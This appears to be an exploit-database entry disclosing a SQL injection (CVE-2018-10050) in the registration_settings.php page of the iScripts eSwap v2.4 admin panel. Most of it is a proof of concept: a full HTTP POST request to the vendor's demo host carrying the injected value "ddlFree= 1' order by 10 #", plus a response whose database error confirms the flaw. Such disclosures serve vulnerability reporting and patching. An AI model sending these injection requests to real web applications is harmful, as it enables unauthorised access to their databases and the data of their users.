# Exploit title: iScripts eSwap v2.4 - SQL injection via the registration_settings.php Admin Panel
# Date: 11/04/2018
# Exploit Author: ManhNho
# Vendor Homepage: https://www.iscripts.com
# Software Link: https://www.iscripts.com/eswap
# Demo Link: https://www.demo.iscripts.com/eswap/demo//admin/adminmain.php
# Version: 2.4
# CVE: CVE-2018-10050
# Tested on: Windows 10 / Kali Linux
# Category: Webapps
 
 
#1. Description
-----------------------------------------------------
iScripts eSwap v2.4 has SQL injection via the "registration_settings.php" function parameter in Admin Panel.

  
#2. Proof of Concept
-----------------------------------------------------

Request:

POST /eswap/demo//admin/registration_settings.php?act=post HTTP/1.1
Host: www.demo.iscripts.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.demo.iscripts.com/eswap/demo//admin/registration_settings.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Cookie: __utma=227100805.298811387.1522637403.1523431492.1523438388.8; __utmz=227100805.1522637403.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); messagesUtk=9ae2fcc5306f4d9c8d433f0f58efb968; __utma=129714457.1603653646.1523416273.1523416273.1523433224.2; __utmz=129714457.1523433224.2.2.utmcsr=iscripts.com|utmccn=(referral)|utmcmd=referral|utmcct=/supportdesk/demo.php; PHPSESSID=i3nkqgvua59eplfm18urecqdb1; __utmb=227100805; __utmc=227100805; hs-messages-is-open=false
Connection: close
Upgrade-Insecure-Requests: 1

ddlFree= 1' order by 10 # &txtDate=1

Response:

HTTP/1.1 200 OK
Date: Wed, 11 Apr 2018 10:06:11 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html
Content-Length: 2645
...
<div class="clear"></div>
</div>
</div>
Unknown column '10' in 'order clause'